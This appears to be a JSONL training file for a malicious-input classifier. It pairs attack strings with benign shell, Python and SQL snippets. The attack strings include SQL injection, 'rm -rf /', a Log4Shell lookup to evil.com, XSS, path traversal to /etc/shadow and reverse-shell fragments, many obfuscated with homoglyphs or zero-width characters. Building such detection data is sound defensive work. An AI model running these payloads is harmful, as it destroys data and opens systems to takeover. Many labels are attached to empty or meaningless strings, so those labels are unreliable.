+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# system(", "label": 1, "category": "system_call"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"\"", "label": 1, "category": "keylogger_installation"}
+{"text": "-- bash -i", "label": 1, "category": "interactive_shell"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "eval( <!-- bypass", "label": 1, "category": "code_execution"}
+{"text": "df  -h", "label": 0, "category": "benign_shell"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/*\n", "label": 1, "category": "ransomware_pattern"}
+{"text": "sh -c \"exec(\"", "label": 1, "category": "code_execution"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "// system(", "label": 1, "category": "system_call"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DELETE FROM users;", "label": 1, "category": "sql_deletion"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "bash -i -- bypass", "label": 1, "category": "interactive_shell"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "/*\n/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "name = 'John Doe'", "label": 0, "category": "benign_python"}
+{"text": "python -c \"\"", "label": 1, "category": "keylogger_installation"}
+{"text": "df -h", "label": 0, "category": "benign_shell"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "echo '..\\'", "label": 1, "category": "path_traversal_windows"}
+{"text": "ps  aux", "label": 0, "category": "benign_shell"}
+{"text": "REM shell_exec", "label": 1, "category": "shell_execution"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "items  =  [x  for  x  in  range(10)]", "label": 0, "category": "benign_python"}
+{"text": " // bypass", "label": 1, "category": "sql_union_injection"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "ruby -e \"system(\"", "label": 1, "category": "system_call"}
+{"text": "cmd /c ", "label": 1, "category": "ransomware_pattern"}
+{"text": "value  =  math_eval('sqrt(16)')", "label": 0, "category": "benign_hard"}
+{"text": "exec( | echo success", "label": 1, "category": "code_execution"}
+{"text": "How do I install Python?", "label": 0, "category": "benign_text"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": "REM ", "label": 1, "category": "sql_time_based"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* ", "label": 1, "category": "sql_union_injection"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm -rf <!-- bypass", "label": 1, "category": "destructive_file_operation"}
+{"text": "#\n", "label": 1, "category": "network_scanning"}
+{"text": "value  =  math_eval('sqrt(16)')", "label": 0, "category": "benign_hard"}
+{"text": "bash -i && echo success", "label": 1, "category": "interactive_shell"}
+{"text": " ", "label": 1, "category": "ransomware_pattern"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "--\n'; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "chmod 777 ; bypass", "label": 1, "category": "permission_escalation"}
+{"text": ";\nbash -i", "label": 1, "category": "interactive_shell"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "from  datetime  import  datetime", "label": 0, "category": "benign_python"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "curl+http://", "label": 1, "category": "remote_code_fetch"}
+{"text": " // bypass", "label": 1, "category": "credential_dumping"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\neval(", "label": 1, "category": "code_execution"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#\n", "label": 1, "category": "privilege_escalation"}
+{"text": "../ && echo success", "label": 1, "category": "path_traversal"}
+{"text": "text  =  'Hello  World'.upper()", "label": 0, "category": "benign_python"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " || echo success", "label": 1, "category": "ransomware_pattern"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "<!-- ", "label": 1, "category": "sql_union_injection"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " /* bypass", "label": 1, "category": "privilege_escalation"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* nc -e", "label": 1, "category": "reverse_shell"}
+{"text": " | echo success", "label": 1, "category": "keylogger_installation"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE data; -- SQL injection", "label": 1, "category": "sql_destructive"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "<!--\nDROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "ls -R", "label": 0, "category": "benign_shell"}
+{"text": "rm -rf /etc && echo done", "label": 1, "category": "destructive_file_operation"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e ''", "label": 1, "category": "ransomware_pattern"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\n", "label": 1, "category": "network_scanning"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DELETE FROM // bypass", "label": 1, "category": "sql_deletion"}
+{"text": "def  hello():  return  'world'", "label": 0, "category": "benign_python"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "def  hello():  return  'world'", "label": 0, "category": "benign_python"}
+{"text": "DROP TABLE # bypass", "label": 1, "category": "sql_destructive"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "// ", "label": 1, "category": "sql_comment_bypass"}
+{"text": "#\nnc -e", "label": 1, "category": "reverse_shell"}
+{"text": "REM\n..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "perl -e 'system('", "label": 1, "category": "system_call"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval()", "label": 1, "category": "sql_comment_bypass"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM\nchmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "# echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "-- DROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "node -e \"DELETE FROM\"", "label": 1, "category": "sql_deletion"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DELETE FROM REM bypass", "label": 1, "category": "sql_deletion"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "python -c \"nc -e\"", "label": 1, "category": "reverse_shell"}
+{"text": "shell_exec", "label": 1, "category": "shell_execution"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "/* TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " || echo success", "label": 1, "category": "reverse_shell"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "ls -la", "label": 0, "category": "benign_shell"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* ", "label": 1, "category": "credential_dumping"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "REM\n", "label": 1, "category": "credential_dumping"}
+{"text": "eval()", "label": 1, "category": "privilege_escalation"}
+{"text": "// UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\nrm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "//\n/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": " ; echo success", "label": 1, "category": "sql_union_injection"}
+{"text": "CHMOD 777", "label": 1, "category": "permission_escalation"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"/etc/passwd\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "#  Note:  This  uses  eval()  internally,  but  it's  safe", "label": 0, "category": "benign_hard"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "grep  'pattern'  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text  =  'Hello  World'.upper()", "label": 0, "category": "benign_python"}
+{"text": " /* bypass", "label": 1, "category": "sql_time_based"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "cmd /c popen(", "label": 1, "category": "process_execution"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "node -e \"rm -rf\"", "label": 1, "category": "destructive_file_operation"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "sh -c \"../\"", "label": 1, "category": "path_traversal"}
+{"text": "ps  aux", "label": 0, "category": "benign_shell"}
+{"text": "result = 'test'.replace('t', 'T')", "label": 0, "category": "benign_python"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": "rm%20-rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "value = math_eval('sqrt(16)')", "label": 0, "category": "benign_hard"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec(TRUNCATE)", "label": 1, "category": "sql_truncation"}
+{"text": "grep  'pattern'  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval(DROP TABLE)", "label": 1, "category": "sql_destructive"}
+{"text": "powershell -Command \"eval(\"", "label": 1, "category": "code_execution"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "chmod 777 /* bypass", "label": 1, "category": "permission_escalation"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "How  do  I  install  Python?", "label": 0, "category": "benign_text"}
+{"text": "head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* popen(", "label": 1, "category": "process_execution"}
+{"text": "';+--", "label": 1, "category": "sql_comment_injection"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "# echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How  can  I  improve  my  code?", "label": 0, "category": "benign_text"}
+{"text": "Please  explain  this  code", "label": 0, "category": "benign_text"}
+{"text": "node -e \"/dev/tcp\"", "label": 1, "category": "tcp_redirection"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": "/etc/shadow -- bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "--\n", "label": 1, "category": "sql_time_based"}
+{"text": "def  calculate_sum(a,  b):  return  a  +  b", "label": 0, "category": "benign_python"}
+{"text": " ; echo success", "label": 1, "category": "keylogger_installation"}
+{"text": "# echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Shell_exec", "label": 1, "category": "shell_execution"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "rm -rf /root && echo done", "label": 1, "category": "destructive_file_operation"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval( REM bypass", "label": 1, "category": "code_execution"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show  me  an  example", "label": 0, "category": "benign_text"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval( -- bypass", "label": 1, "category": "code_execution"}
+{"text": "echo ''", "label": 1, "category": "sql_time_based"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UPDATE users SET last_login = NOW() WHERE id = 1", "label": 0, "category": "benign_sql"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "eval(..\\)", "label": 1, "category": "path_traversal_windows"}
+{"text": "..\\ -- bypass", "label": 1, "category": "path_traversal_windows"}
+{"text": "cmd /c ", "label": 1, "category": "sql_comment_bypass"}
+{"text": "UNION SELECT ; echo success", "label": 1, "category": "sql_injection"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../ | echo success", "label": 1, "category": "path_traversal"}
+{"text": "TRUNCATE # bypass", "label": 1, "category": "sql_truncation"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "node -e \"TRUNCATE\"", "label": 1, "category": "sql_truncation"}
+{"text": "ls  -la", "label": 0, "category": "benign_shell"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "What  time  is  it?", "label": 0, "category": "benign_text"}
+{"text": "name  =  'John  Doe'", "label": 0, "category": "benign_python"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "; DROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "<!--\n'; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " -- bypass", "label": 1, "category": "privilege_escalation"}
+{"text": "eval(/etc/passwd)", "label": 1, "category": "sensitive_file_access"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "with  open('file.txt',  'r')  as  f:  content  =  f.read()", "label": 0, "category": "benign_python"}
+{"text": "/*\n../", "label": 1, "category": "path_traversal"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "-- eval(", "label": 1, "category": "code_execution"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "cmd /c TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import sys", "label": 0, "category": "benign_python"}
+{"text": "Show  me  an  example", "label": 0, "category": "benign_text"}
+{"text": "REM\n../", "label": 1, "category": "path_traversal"}
+{"text": " REM bypass", "label": 1, "category": "ransomware_pattern"}
+{"text": "popen( -- bypass", "label": 1, "category": "process_execution"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": "/* passthru", "label": 1, "category": "passthru_execution"}
+{"text": "perl -e 'DELETE FROM'", "label": 1, "category": "sql_deletion"}
+{"text": " REM bypass", "label": 1, "category": "reverse_shell"}
+{"text": "items  =  [x  for  x  in  range(10)]", "label": 0, "category": "benign_python"}
+{"text": "/etc/shadow // bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "sort file.txt", "label": 0, "category": "benign_shell"}
+{"text": "--\nDROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "passthru ", "label": 1, "category": "passthru_execution"}
+{"text": "exec(DELETE FROM)", "label": 1, "category": "sql_deletion"}
